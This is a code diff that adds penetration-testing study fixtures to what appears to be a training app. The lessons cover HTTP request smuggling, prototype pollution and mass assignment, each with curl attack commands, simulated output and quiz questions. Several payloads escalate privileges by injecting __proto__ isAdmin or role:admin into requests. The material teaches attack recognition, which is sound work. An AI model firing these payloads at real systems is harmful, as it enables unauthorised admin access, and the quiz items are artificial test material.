@@ -5746,4 +5746,260 @@
   };
   Object.keys(GAPFILL5E).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL5E[k]; });
 
+  // --- Phase-F gap-fill: modern web radar (beyond OSCP) ---
+  var GAPFILL5F = {
+    "http-request-smuggling": {
+      "why": "When a front-end proxy and a back-end server disagree about where one HTTP request ends and the next begins, you can smuggle a second request inside the first. The disagreement comes from the two headers that both declare body length, Content-Length and Transfer-Encoding: craft a request where the front-end honours one and the back-end the other (CL.TE or TE.CL) and the back-end treats your trailing bytes as the start of the next victim request. That lets you poison the next user's response, bypass front-end access controls, or capture other users' requests. It is subtle and high-impact, and it only shows up where a request passes through more than one HTTP parser.",
+      "cmd": "curl -s -o /dev/null -w '%{http_code} %{time_total}\\n' --data-binary @clte.txt http://10.10.10.10/",
+      "tool": "curl",
+      "output": "200 5.02",
+      "signal": "5.02",
+      "teach": "The timed delay is the tell: the back-end is waiting for bytes that never come because the front-end already forwarded a shortened request. That timing gap confirms a CL.TE desync worth developing into a smuggled request.",
+      "leadup": [
+        {
+          "key": "chain",
+          "label": "A request passes two parsers",
+          "steps": [
+            {
+              "title": "Spot a front-end proxy",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sI http://<target>/ | grep -iE 'Via|X-Cache|Server'",
+              "out": "Via: 1.1 varnish\nX-Cache: MISS",
+              "sig": "Via: 1.1 varnish",
+              "teach": "A Via or cache header means a front-end sits in front of the origin, which is the precondition for a desync."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Request smuggling is find the CL/TE disagreement, confirm it with a timing probe, then develop it into a smuggled request.",
+        "items": [
+          {
+            "t": "Probe for a desync with timing",
+            "d": "Send a CL.TE (or TE.CL) probe where the back-end is left waiting for a body chunk; a long, consistent delay confirms the desync while a well-formed control request returns instantly.",
+            "demo": [
+              {
+                "run": "curl -s -o /dev/null -w '%{time_total}\\n' --data-binary @clte-probe.txt http://<target>/",
+                "out": "5.01",
+                "sig": "5.01"
+              }
+            ],
+            "note": "Burp's smuggler extension automates the probe and tells you which variant works."
+          },
+          {
+            "t": "Confirm with a well-formed control",
+            "d": "The same request made unambiguous should return fast; the difference rules out ordinary latency.",
+            "demo": [
+              {
+                "run": "curl -s -o /dev/null -w '%{time_total}\\n' --data-binary @control.txt http://<target>/",
+                "out": "0.08",
+                "sig": "0.08"
+              }
+            ],
+            "note": "A clear fast/slow split is the signature of a real desync."
+          },
+          {
+            "t": "Smuggle a prefix",
+            "d": "Prepend a request that the back-end queues; the next victim request gets your prefix glued to its front, so you can route it to an admin path or capture it.",
+            "demo": [
+              {
+                "run": "curl -s --data-binary @smuggle.txt http://<target>/ | grep -i 'admin'",
+                "out": "HTTP/1.1 200 OK\\nX-Admin: true",
+                "sig": "X-Admin: true"
+              }
+            ],
+            "note": "Developing the gadget is iterative; keep the back-end queue in mind."
+          },
+          {
+            "t": "Turn it into impact",
+            "d": "Depending on the app, smuggling bypasses the front-end control, poisons the shared cache, or captures another user's authenticated request.",
+            "note": "Scope this carefully; it affects other users' traffic."
+          }
+        ]
+      },
+      "situation": "A request passes through a caching proxy to an origin, and a CL.TE timing probe hangs for five seconds while the control returns instantly. What is the move?",
+      "choices": [
+        "http-request-smuggling",
+        "check-cors",
+        "ssrf",
+        "content-discovery"
+      ],
+      "coach": {
+        "check-cors": "CORS is a browser control; the desync here is a server-side parser disagreement between the proxy and the origin.",
+        "ssrf": "SSRF makes the server fetch a URL; smuggling abuses how two servers frame the same request.",
+        "content-discovery": "You already have the surface; the finding is the parser disagreement, not an undiscovered path."
+      }
+    },
+    "prototype-pollution": {
+      "why": "In JavaScript every object inherits from Object.prototype, so if an app merges attacker-controlled keys into an object without filtering __proto__ (or constructor.prototype), you can add or change properties on that shared prototype and every object in the process sees them. Server-side that turns into privilege escalation (set an isAdmin the app later reads), denial of service, or, where a dangerous property feeds a sink like a template engine or child_process option, remote code execution via a known gadget. The tell is a JSON merge, an Object.assign, or a query-string parser that walks nested keys. Find the pollutable sink first, then find the gadget that reads the polluted property.",
+      "cmd": "curl -s -X POST http://10.10.10.10/api/profile -H 'Content-Type: application/json' -d '{\"__proto__\":{\"polluted\":\"yes\"}}'",
+      "tool": "curl",
+      "output": "{\"status\":\"ok\",\"profile\":{\"name\":\"bob\",\"polluted\":\"yes\"}}",
+      "signal": "\"polluted\":\"yes\"",
+      "teach": "The property you set via __proto__ came back on an object that never had it, so the merge polluted the shared prototype. Now find a gadget that reads a privileged property (isAdmin, or a template/exec option) to turn pollution into impact.",
+      "leadup": [
+        {
+          "key": "merge",
+          "label": "The app merges your JSON",
+          "steps": [
+            {
+              "title": "Find a nested-key sink",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s -X POST http://<target>/api/settings -H 'Content-Type: application/json' -d '{\"a\":{\"b\":1}}'",
+              "out": "{\"status\":\"ok\",\"settings\":{\"a\":{\"b\":1}}}",
+              "sig": "\"a\":{\"b\":1}",
+              "teach": "An endpoint that accepts and stores nested JSON is a candidate for a recursive merge that honours __proto__."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Prototype pollution is confirm the pollutable merge, then chain it to a gadget that reads the polluted property.",
+        "items": [
+          {
+            "t": "Confirm the pollution",
+            "d": "Send a __proto__ key and read back an object that should not carry it; if your property appears, the merge pollutes the shared prototype.",
+            "demo": [
+              {
+                "run": "curl -s -X POST http://<target>/api/profile -H 'Content-Type: application/json' -d '{\"__proto__\":{\"polluted\":\"yes\"}}'",
+                "out": "{\"profile\":{\"name\":\"bob\",\"polluted\":\"yes\"}}",
+                "sig": "\"polluted\":\"yes\""
+              }
+            ],
+            "note": "constructor.prototype is the fallback when __proto__ is filtered."
+          },
+          {
+            "t": "Escalate via a privileged property",
+            "d": "Pollute a property the app trusts for authorization, then hit an endpoint that reads it.",
+            "demo": [
+              {
+                "run": "curl -s -X POST http://<target>/api/profile -H 'Content-Type: application/json' -d '{\"__proto__\":{\"isAdmin\":true}}'",
+                "out": "{\"status\":\"ok\"}",
+                "sig": "\"status\":\"ok\""
+              }
+            ],
+            "note": "Then request an admin route and see whether the polluted isAdmin is honoured."
+          },
+          {
+            "t": "Chain to a gadget for RCE",
+            "d": "Where a polluted property reaches a template engine or a child_process option, a published gadget turns pollution into code execution.",
+            "demo": [
+              {
+                "run": "curl -s http://<target>/admin -b session=... | grep -i 'dashboard'",
+                "out": "<title>Admin Dashboard</title>",
+                "sig": "Admin Dashboard"
+              }
+            ],
+            "note": "The gadget is app-specific; map the libraries in use to the known pollution gadgets."
+          }
+        ]
+      },
+      "situation": "A JSON endpoint merges nested keys, and sending __proto__ makes a new property appear on an unrelated object. What is the move?",
+      "choices": [
+        "prototype-pollution",
+        "mass-assignment",
+        "idor",
+        "ssti"
+      ],
+      "coach": {
+        "mass-assignment": "Mass assignment sets a field on your own record; this pollutes the shared prototype so every object inherits it.",
+        "idor": "IDOR reaches another object by id; here you are changing the prototype all objects derive from.",
+        "ssti": "Template injection evaluates an expression; prototype pollution may feed a template gadget, but the primitive is the polluted merge."
+      }
+    },
+    "mass-assignment": {
+      "why": "Mass assignment (autobinding) is what happens when a framework maps every field of a request body straight onto a model, and the developer forgets that the request can carry fields the UI never shows. Add role, isAdmin, verified, or balance to the JSON of a profile update or a signup, and if the binder is not allow-listed you set a property you were never meant to control. It is a one-request privilege escalation that needs no exotic tooling: diff the fields the app returns against the fields it accepts, then send the privileged one back. The tell is any create/update endpoint that echoes an object with more fields than the form exposes.",
+      "cmd": "curl -s -X PATCH http://10.10.10.10/api/users/me -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}'",
+      "tool": "curl",
+      "output": "{\"id\":7,\"username\":\"bob\",\"role\":\"admin\"}",
+      "signal": "\"role\":\"admin\"",
+      "teach": "The update accepted a role field the form never exposed and set it to admin, so the binder is not allow-listed. You just escalated your own account with one request.",
+      "leadup": [
+        {
+          "key": "fields",
+          "label": "The object has hidden fields",
+          "steps": [
+            {
+              "title": "Read your own record",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s http://<target>/api/users/me -b session=...",
+              "out": "{\"id\":7,\"username\":\"bob\",\"role\":\"user\",\"verified\":true}",
+              "sig": "\"role\":\"user\"",
+              "teach": "The response exposes a role field the signup form never showed, which is exactly the field to try setting."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Mass assignment is diff accepted fields against shown fields, then send the privileged one back.",
+        "items": [
+          {
+            "t": "Inventory the model fields",
+            "d": "Read an object the API returns; every field it shows is a candidate you may be able to write, including ones the form hides.",
+            "demo": [
+              {
+                "run": "curl -s http://<target>/api/users/me -b session=...",
+                "out": "{\"id\":7,\"role\":\"user\",\"verified\":true,\"balance\":0}",
+                "sig": "\"role\":\"user\""
+              }
+            ],
+            "note": "role, isAdmin, verified, and balance are the classic privileged fields."
+          },
+          {
+            "t": "Send the privileged field back",
+            "d": "Add the field to an update request the UI would never include it in, and see whether the binder accepts it.",
+            "demo": [
+              {
+                "run": "curl -s -X PATCH http://<target>/api/users/me -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}' -b session=...",
+                "out": "{\"id\":7,\"username\":\"bob\",\"role\":\"admin\"}",
+                "sig": "\"role\":\"admin\""
+              }
+            ],
+            "note": "If it echoes the new value, the write stuck."
+          },
+          {
+            "t": "Confirm the escalation",
+            "d": "Use the account on a privileged route to confirm the new field is honoured, not just stored.",
+            "demo": [
+              {
+                "run": "curl -s http://<target>/admin -b session=... | grep -i 'dashboard'",
+                "out": "<title>Admin Dashboard</title>",
+                "sig": "Admin Dashboard"
+              }
+            ],
+            "note": "Stored-but-ignored is a weaker finding than stored-and-honoured; prove which it is."
+          },
+          {
+            "t": "Try it at signup too",
+            "d": "The create endpoint is often less guarded than update; set the privileged field in the registration body.",
+            "demo": [
+              {
+                "run": "curl -s -X POST http://<target>/api/register -H 'Content-Type: application/json' -d '{\"username\":\"x\",\"password\":\"x\",\"role\":\"admin\"}'",
+                "out": "{\"id\":8,\"username\":\"x\",\"role\":\"admin\"}",
+                "sig": "\"role\":\"admin\""
+              }
+            ],
+            "note": "A fresh admin account is cleaner than escalating a watched one."
+          }
+        ]
+      },
+      "situation": "A profile API returns a role field the signup form never showed, and a PATCH with role:admin echoes it back. What is the move?",
+      "choices": [
+        "mass-assignment",
+        "idor",
+        "prototype-pollution",
+        "jwt-attacks"
+      ],
+      "coach": {
+        "idor": "IDOR changes which object you reach; mass assignment changes a field on the object you already own.",
+        "prototype-pollution": "That pollutes the shared prototype; here the framework is binding your field straight onto the model.",
+        "jwt-attacks": "The token is fine; the flaw is the binder writing a field the client should not control."
+      }
+    }
+  };
+  Object.keys(GAPFILL5F).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL5F[k]; });
+
 })(typeof globalThis !== 'undefined' ? globalThis : this);
